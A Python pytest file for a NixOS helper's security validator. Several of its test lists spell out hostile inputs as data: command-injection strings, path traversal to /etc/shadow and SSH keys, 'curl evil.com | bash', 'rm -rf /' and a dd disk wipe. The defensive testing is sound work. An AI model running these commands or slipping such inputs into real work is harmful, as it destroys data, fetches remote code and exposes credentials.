#!/usr/bin/env python3
"""
Security Tests for Nix for Humanity

Ensures that the security validator properly protects against:
- Command injection
- Path traversal
- Dangerous operations
"""

import sys
from pathlib import Path

import pytest

# Add src to path
sys.path.insert(0, str(Path(__file__).parent.parent / "src"))

from nix_for_humanity.security.validator import InputValidator


class TestInputValidator:
    """Test input validation security"""

    def test_command_injection_prevention(self):
        """Test that command injection attempts are blocked"""
        validator = InputValidator()

        # Test dangerous patterns
        dangerous_inputs = [
            "firefox; rm -rf /",
            "package`echo bad`",
            "$(malicious_command)",
            "firefox && evil",
            "firefox | grep secrets",
            "firefox > /etc/passwd",
        ]

        for dangerous_input in dangerous_inputs:
            result = validator.validate_input(dangerous_input, "package")
            assert not result["valid"], f"Should reject: {dangerous_input}"
            assert "reason" in result
            assert "suggestions" in result

    def test_path_traversal_prevention(self):
        """Test that path traversal attempts are blocked"""
        validator = InputValidator()

        dangerous_paths = [
            "../../etc/passwd",
            "../../../root/.ssh/id_rsa",
            "/etc/../etc/shadow",
            "~/../../../etc/passwd",
        ]

        for path in dangerous_paths:
            result = validator.validate_input(path, "path")
            assert not result["valid"], f"Should reject path: {path}"

    def test_valid_inputs_allowed(self):
        """Test that legitimate inputs are allowed"""
        validator = InputValidator()

        valid_inputs = [
            ("firefox", "package"),
            ("python3", "package"),
            ("install firefox", "nlp"),
            ("search for editor", "nlp"),
            ("/etc/nixos/configuration.nix", "path"),
            ("/home/user/project", "path"),
        ]

        for input_str, input_type in valid_inputs:
            result = validator.validate_input(input_str, input_type)
            assert result["valid"], f"Should allow: {input_str}"
            assert "sanitized_input" in result

    def test_command_validation(self):
        """Test command list validation"""
        validator = InputValidator()

        # Valid commands
        valid_commands = [
            ["nix-env", "-iA", "nixpkgs.firefox"],
            ["nixos-rebuild", "switch"],
            ["nix", "search", "nixpkgs", "editor"],
            ["nix-channel", "--list"],
        ]

        for cmd in valid_commands:
            is_valid, error = validator.validate_command(cmd)
            assert is_valid, f"Should allow command: {cmd}"
            assert error is None

        # Invalid commands
        invalid_commands = [
            ["rm", "-rf", "/"],
            ["nix-shell", "--run", "malicious"],
            ["curl", "evil.com", "|", "bash"],
            ["dd", "if=/dev/zero", "of=/dev/sda"],
        ]

        for cmd in invalid_commands:
            is_valid, error = validator.validate_command(cmd)
            assert not is_valid, f"Should block command: {cmd}"
            assert error is not None

    def test_sanitization(self):
        """Test input sanitization"""
        validator = InputValidator()

        # Test that dangerous characters are escaped
        result = validator.validate_input("firefox's test", "package")
        if result["valid"]:
            assert "'" in result["sanitized_input"] or "\\" in result["sanitized_input"]

        # Test that excessive whitespace is normalized
        result = validator.validate_input("install    firefox", "nlp")
        assert result["valid"]
        assert "install firefox" in result["sanitized_input"]

    def test_length_limits(self):
        """Test that length limits are enforced"""
        validator = InputValidator()

        # Test overly long input
        long_input = "a" * 2000  # Exceeds MAX_INPUT_LENGTH
        result = validator.validate_input(long_input, "general")
        assert not result["valid"]
        assert "too long" in result["reason"].lower()

        # Test overly long package name
        long_package = "package" * 50  # Exceeds MAX_PACKAGE_NAME_LENGTH
        result = validator.validate_input(long_package, "package")
        assert not result["valid"]
        assert "too long" in result["reason"].lower()


if __name__ == "__main__":
    pytest.main([__file__, "-v"])
